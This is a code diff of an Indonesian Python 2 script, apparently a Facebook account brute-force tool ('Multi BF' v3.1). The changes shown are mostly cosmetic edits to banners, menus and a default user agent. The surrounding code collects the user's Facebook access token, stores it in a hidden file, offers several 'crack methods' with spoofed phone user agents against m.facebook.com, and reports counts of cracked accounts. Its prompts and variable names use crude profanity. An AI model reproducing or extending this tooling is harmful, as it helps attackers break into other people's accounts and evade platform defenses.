@@ -88,22 +88,22 @@ def tod():
 logo =  ''' \033[0;96m  __  ___     ____  _   ___  ____
 \033[0;96m  /  |/  /_ __/ / /_(_) / _ )/ __/\033[0;97m|| Created By \033[0;93mAang-XD
 \033[0;96m / /|_/ / // / / __/ / / _  / _/  \033[0;97m|| Youtube \033[0;93mAang-XD
-\033[0;96m/_/  /_/\_,_/_/\__/_/ /____/_/\033[0;93mv3.1\033[0;97m|| Facebook \033[0;93mSaya Aang'''
+\033[0;96m/_/  /_/\_,_/_/\__/_/ /____/_/\033[0;93mv3.1\033[0;97m|| Facebook \033[0;93mMyAangXD'''
 
 lo_ngentod = '1714009362122228'
 #Crack selesai sayang hehe
 def hasil(ok,cp):
     if len(ok) != 0 or len(cp) != 0:
-        print '\n\n%s╔══[%s✓%s] crack selesai sayang...'%(N,K,N)
-        print '╠══[%s•%s] total akun OK : %s%s%s'%(O,N,H,str(len(ok)),N)
-        print '╚══[%s•%s] total akun CP : %s%s%s'%(O,N,K,str(len(cp)),N);exit()
+        print '\n\n%s[%s✓%s] crack selesai sayang...'%(N,H,N)
+        print '[%s✓%s] total akun OK : %s%s%s'%(O,N,H,str(len(ok)),N)
+        print '[%s✓%s] total akun CP : %s%s%s'%(O,N,H,str(len(cp)),N);exit()
     else:
         print '\n\n[%s!%s] awokawok kaga dapet hasil'%(M,N);exit()
 
 #Masuk token PLN
 def yayanxd():
     os.system('clear')
-    print ('%s╔══[%s tools ini menggunakan login token facebook \n%s╠══[%s apakah sudah tau cara mendapatkan token facebook? \n%s╠══[%s ketik %s(open)%s untuk mendapatkan token facebook '%(O,N,O,N,O,N,H,N))
+    print ('%s╔══[%s Tools ini menggunakan login token facebook \n%s╠══[%s Apakah sudah tau cara mendapatkan token facebook? \n%s╠══[%s Ketik [ %sopen%s ] untuk mendapatkan token facebook '%(O,N,O,N,O,N,H,N))
     print ('%s║%s '%(O,N))
     kontol = raw_input('%s%s╚══[?]%s Masukkan Token :%s '%(N,M,N,H))
     if kontol in ('open', 'Open', 'OPEN'):
@@ -118,14 +118,14 @@ def yayanxd():
         nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(kontol)).json()['name']
         print '%s║%s '%(O,N)
         print '%s╠══[%s Selamat Datang %s%s%s Ngentod \033[0;96m]'%(O,N,K,nama,N);time.sleep(2)
-        print '%s╠══[%s Script Ini Baru Di Update Versi 3.1 \033[0;96m]'%(O,N);time.sleep(2)
+        print '%s╠══[%s Script Ini Baru Di Update Pada 2022 \033[0;96m]'%(O,N);time.sleep(2)
         print '%s╠══[%s Untuk Info Lengkap Cek Di Informasi Script \033[0;96m]'%(O,N);time.sleep(2)
         print '%s╠══[%s Sebelum Menggunakan Script Ini Mohon Untuk \033[0;96m]'%(O,N);time.sleep(2)
         print '%s╠══[%s Subscribe Channel Aang-XD Dulu Ya:v \033[0;96m]'%(O,N);time.sleep(2)
         print '%s║%s '%(O,N);time.sleep(0.07)
         print '%s║%s '%(O,N);time.sleep(0.06)
         open('.memek.txt', 'w').write(kontol)
-        raw_input('%s╚══[%s TEKAN ENTER \033[0;96m]'%(O,N));wuhan(kontol)
+        raw_input('%s╚══[%s ENTER \033[0;96m]'%(O,N));wuhan(kontol)
         os.system('xdg-open https://youtube.com/channel/UCqwjydkaE3y0qo-3Yl3yL3A')
         
         moch_yayan()
@@ -165,7 +165,7 @@ def moch_yayan():
     print '%s╠══[7]%s Lihat hasil \033[0;93mcrack \033[0;97msaya'%(O,N);time.sleep(0.04)
     print '%s╠══[8]%s Setting \033[0;93muser agent'%(O,N);time.sleep(0.04)
     print '%s╠══[9]%s Informasi %sScript Multi BF%s'%(O,N,O,N);time.sleep(0.04)
-    print '%s╠══[0]%s Keluar [%sAhh Ngecrot%s]'%(O,N,K,N);time.sleep(0.04)
+    print '%s╠══[0]%s Keluar \033[0;96m[%sAhh Ngecrot%s\033[0;96m]'%(O,N,K,N);time.sleep(0.04)
     print '%s║%s'%(O,N);time.sleep(0.04)
     pepek = raw_input('\033[0;96m╚══[•] \033[0;97mMenu : ')
     if pepek == '':
@@ -578,9 +578,8 @@ def yo_ndak_tau_ko_tanya_saia():
         print '\n%s╚══[%s×%s] Gak Boleh Kosong Kentod'%(N,M,N);yo_ndak_tau_ko_tanya_saia()
     try:
         open('YNTKTS.txt', 'w').write(anjng);time.sleep(2)
-        jalan('\n%s╔══[%s✓%s] Berhasil Mengganti User Agent ]'%(N,H,N))
-        print '%s║%s '%(P)
-        raw_input('%s╚══[ %sKEMBALI%s ]'%(N,O,N));moch_yayan()
+        jalan('\n%s[%s✓%s] Berhasil Mengganti User Agent'%(N,H,N))
+        raw_input('%s[ %sKEMBALI%s ]'%(N,H,N));moch_yayan()
     except:pass
 
 # Cek User Agent
@@ -590,9 +589,8 @@ def check_yntkts():
     except IOError:
     	user_agent = '%s-'%(M)
     except: pass
-    print '\n%s╔══[%s•%s] User Agent Anda Saat Ini : %s%s'%(N,O,N,H,user_agent)
-    print '%s║%s '%(P)
-    raw_input('%s╚══[ %sKEMBALI%s ]'%(N,O,N));moch_yayan()
+    print '\n%s[%s•%s] User Agent Anda Saat Ini : %s%s'%(N,O,N,H,user_agent)
+    raw_input('%s[ %sKEMBALI%s ]'%(N,O,N));moch_yayan()
 
 # Mulai Ngecrot Awokawokawokkawok
 class __crack__:
@@ -714,22 +712,22 @@ class __crack__:
                     print '%s║%s '%(O,N)
                     print '\033[0;96m╠══[ \033[0;97mSilahkan Pilih Metode Crack \033[0;96m]'
                     print '%s║%s '%(O,N)
-                    print '%s╠══[1]%s Metode \033[0;93mB-Api \033[0;97mV1 \033[0;96m[Ua Nokia]'%(O,N)
-                    print '%s╠══[2]%s Metode \033[0;93mB-Api \033[0;97mV2 \033[0;96m[Ua Huawei]'%(O,N)
-                    print '%s╠══[3]%s Metode \033[0;93mMbasic \033[0;97mV1 \033[0;96m[Ua Vivo]'%(O,N)
-                    print '%s╠══[4]%s Metode \033[0;93mMbasic \033[0;97mV2 \033[0;96m[Ua Asus]'%(O,N)
-                    print '%s╠══[5]%s Metode \033[0;93mMobile Fb \033[0;96m[Ua Windows]'%(O,N)
+                    print '%s╠══[1]%s Metode \033[0;93mB-Api \033[0;97mV1 \033[0;96m[ \033[0;93mUa Nokia \033[0;96m]'%(O,N)
+                    print '%s╠══[2]%s Metode \033[0;93mB-Api \033[0;97mV2 \033[0;96m[ \033[0;93mUa Xiaomi \033[0;96m]'%(O,N)
+                    print '%s╠══[3]%s Metode \033[0;93mMbasic \033[0;97mV1 \033[0;96m[ \033[0;93mUa Vivo \033[0;96m]'%(O,N)
+                    print '%s╠══[4]%s Metode \033[0;93mMbasic \033[0;97mV2 \033[0;96m[ \033[0;93mUa Asus \033[0;96m]'%(O,N)
+                    print '%s╠══[5]%s Metode \033[0;93mMobile Fb \033[0;96m[ \033[0;93mUa Windows \033[0;96m]'%(O,N)
                     print '%s║%s '%(O,N)
                     __yan__(pwek.split(','))
                     break  
         elif ___yayanganteng___ in ('T', 't'):
             print '\n\033[0;96m╔══[ \033[0;97mSilahkan Pilih Metode Crack \033[0;96m]'
             print '%s║%s '%(O,N)
-            print '%s╠══[1]%s Metode \033[0;93mB-Api \033[0;97mV1 \033[0;96m[Ua Nokia]'%(O,N)
-            print '%s╠══[2]%s Metode \033[0;93mB-Api \033[0;97mV2 \033[0;96m[Ua Huawei]'%(O,N)
-            print '%s╠══[3]%s Metode \033[0;93mMbasic \033[0;97mV1 \033[0;96m[Ua Vivo]'%(O,N)
-            print '%s╠══[4]%s Metode \033[0;93mMbasic \033[0;97mV2 \033[0;96m[Ua Asus]'%(O,N)
-            print '%s╠══[5]%s Metode \033[0;93mMobile Fb \033[0;96m[Ua Windows]'%(O,N)
+            print '%s╠══[1]%s Metode \033[0;93mB-Api \033[0;97mV1 \033[0;96m[ \033[0;93mUa Nokia \033[0;96m]'%(O,N)
+            print '%s╠══[2]%s Metode \033[0;93mB-Api \033[0;97mV2 \033[0;96m[ \033[0;93mUa Xiaomi \033[0;96m]'%(O,N)
+            print '%s╠══[3]%s Metode \033[0;93mMbasic \033[0;97mV1 \033[0;96m[ \033[0;93mUa Vivo \033[0;96m]'%(O,N)
+            print '%s╠══[4]%s Metode \033[0;93mMbasic \033[0;97mV2 \033[0;96m[ \033[0;93mUa Asus \033[0;96m]'%(O,N)
+            print '%s╠══[5]%s Metode \033[0;93mMobile Fb \033[0;96m[ \033[0;93mUa Windows \033[0;96m]'%(O,N)
             print '%s║%s '%(O,N)
             self.__pler__()
         else:
@@ -798,7 +796,7 @@ class __crack__:
             try:
             	_kontol = open('YNTKTS.txt', 'r').read()
             except (KeyError, IOError):
-            	_kontol = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
+            	_kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
             ses = requests.Session()
             ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
             p = ses.get("https://m.facebook.com")
